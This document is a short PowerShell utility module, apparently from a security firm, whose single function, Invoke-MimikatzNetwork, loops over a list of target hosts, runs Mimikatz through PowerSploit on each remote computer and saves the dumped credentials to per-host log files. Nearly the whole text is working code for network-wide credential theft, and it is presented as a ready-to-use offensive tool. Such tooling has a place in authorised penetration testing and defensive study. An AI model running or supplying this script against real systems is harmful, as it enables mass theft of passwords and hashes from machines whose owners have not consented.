<#
    ScipUtilities provides various utility commandlets.

    Author: Eleanore Young, Michael Schneider, scip AG
    License: MIT
    Copyright: 2017 Eleanore Young, Michael Schneider, scip AG
    Required Dependencies: None
    Optional Dependencies: None
#>

#Requires -Version 2
Set-StrictMode -Version 2

function Invoke-MimikatzNetwork {
<#
    .SYNOPSIS
    Invoke Mimikatz using the PowerSploit framework over the network.

    .PARAMETER HostFile
    The path to a list of target hosts.
#>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path $_})]
        [String]
        $HostFile
    )

    $BasePath = "C:\tmp"
    $Timestamp = (Get-Date).ToString("yyyyMd")
    $Protocol = "$basePath\protocol-$timestamp.txt"
    $Hosts = Get-Content $HostFile

    Foreach ($ComputerName in $Hosts) {

        $Time = Get-Date -Format G
        $StartMessage = "[*] $Time - Connecting to $ComputerName..."
        $StartMessage | Tee-Object -Append -FilePath $Protocol    

        $LogMimikatz = "$BasePath\cred_$ComputerName.log"

        Try
        {
            Invoke-Mimikatz -ComputerName $ComputerName -ErrorAction Stop -ErrorVariable ErrorInvokeMimikatz | Out-File -Encoding utf8 $LogMimikatz
        }
        Catch
        { 
            $Time = Get-Date -Format G
            $ErrorMessage = "[!] $Time - ERROR: $ComputerName - " + $ErrorInvokeMimikatz[1].FullyQualifiedErrorId
            $ErrorMessage | Tee-Object -Append -FilePath $Protocol
            $ErrorInvokeMimikatz = $null
        }    
    
        $Time = Get-Date -Format G
        $EndMessage = "[*] $Time - $ComputerName done"
        $EndMessage | Tee-Object -Append -FilePath $Protocol
    }
}